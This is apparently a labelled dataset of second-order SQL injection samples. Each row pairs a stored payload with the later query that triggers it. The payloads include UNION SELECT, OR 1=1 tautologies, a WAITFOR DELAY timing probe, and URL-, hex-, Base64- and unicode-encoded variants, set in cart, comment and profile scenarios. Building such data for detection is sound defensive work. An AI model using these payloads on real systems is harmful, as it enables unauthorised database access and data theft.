store_id,scenario,step1_action,step1_payload,step1_query,step2_action,step2_payload,step2_query,encoding,storage_point,trigger_point,Label,attack_type
SO_00043,shopping_cart,STORE,"' UNION SELECT NULL, NULL--","INSERT INTO cart_items (product_name, price) VALUES ('' UNION SELECT NULL, NULL--', 99.99)",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM cart_items WHERE product_name='' UNION SELECT NULL, NULL--'",none,cart_items table,checkout summary query,1,second_order_injection
SO_00044,shopping_cart,STORE,1' AND '1'='1,"INSERT INTO cart_items (product_name, price) VALUES ('1' AND '1'='1', 99.99)",RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM cart_items WHERE product_name='1' AND '1'='1',none,cart_items table,checkout summary query,1,second_order_injection
SO_00045,shopping_cart,STORE,%27%20OR%20%271%27%3D%271,"INSERT INTO cart_items (product_name, price) VALUES ('%27%20OR%20%271%27%3D%271', 99.99)",RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM cart_items WHERE product_name='%27%20OR%20%271%27%3D%271',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00046,shopping_cart,STORE,0x61646d696e272d2d,"INSERT INTO cart_items (product_name, price) VALUES ('0x61646d696e272d2d', 99.99)",RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM cart_items WHERE product_name='0x61646d696e272d2d',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00047,shopping_cart,STORE,YWRtaW4nLS0=,"INSERT INTO cart_items (product_name, price) VALUES ('YWRtaW4nLS0=', 99.99)",RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM cart_items WHERE product_name='YWRtaW4nLS0=',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00048,shopping_cart,STORE,\u0027 OR \u00271\u0027=\u00271,"INSERT INTO cart_items (product_name, price) VALUES ('\u0027 OR \u00271\u0027=\u00271', 99.99)",RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM cart_items WHERE product_name='\u0027 OR \u00271\u0027=\u00271',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00049,shopping_cart,STORE,'; WAITFOR DELAY '00:00:05'--,"INSERT INTO cart_items (product_name, price) VALUES (''; WAITFOR DELAY '00:00:05'--', 99.99)",RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM cart_items WHERE product_name=''; WAITFOR DELAY '00:00:05'--',none,cart_items table,checkout summary query,1,second_order_injection
SO_00050,comment_field_encoded,STORE_ENCODED,%27%20OR%201%3D1--,INSERT INTO user_comments table (data) VALUES ('%27%20OR%201%3D1--'),DECODE_EXECUTE,' OR 1=1--,SELECT * FROM user_comments table WHERE data=DECODE('%27%20OR%201%3D1--'),URL,user_comments table,admin dashboard query,1,second_order_encoded
SO_00051,comment_field_encoded,STORE_ENCODED,0x61646d696e272d2d,INSERT INTO user_comments table (data) VALUES ('0x61646d696e272d2d'),DECODE_EXECUTE,admin'--,SELECT * FROM user_comments table WHERE data=DECODE('0x61646d696e272d2d'),Hex,user_comments table,admin dashboard query,1,second_order_encoded
SO_00052,comment_field_encoded,STORE_ENCODED,YWRtaW4nLS0=,INSERT INTO user_comments table (data) VALUES ('YWRtaW4nLS0='),DECODE_EXECUTE,admin'--,SELECT * FROM user_comments table WHERE data=DECODE('YWRtaW4nLS0='),Base64,user_comments table,admin dashboard query,1,second_order_encoded
SO_00053,profile_field_encoded,STORE_ENCODED,%27%20OR%201%3D1--,INSERT INTO user_profile table (data) VALUES ('%27%20OR%201%3D1--'),DECODE_EXECUTE,' OR 1=1--,SELECT * FROM user_profile table WHERE data=DECODE('%27%20OR%201%3D1--'),URL,user_profile table,search query or profile display,1,second_order_encoded
SO_00054,profile_field_encoded,STORE_ENCODED,0x61646d696e272d2d,INSERT INTO user_profile table (data) VALUES ('0x61646d696e272d2d'),DECODE_EXECUTE,admin'--,SELECT * FROM user_profile table WHERE data=DECODE('0x61646d696e272d2d'),Hex,user_profile table,search query or profile display,1,second_order_encoded
SO_00055,profile_field_encoded,STORE_ENCODED,YWRtaW4nLS0=,INSERT INTO user_profile table (data) VALUES ('YWRtaW4nLS0='),DECODE_EXECUTE,admin'--,SELECT * FROM user_profile table WHERE data=DECODE('YWRtaW4nLS0='),Base64,user_profile table,search query or profile display,1,second_order_encoded
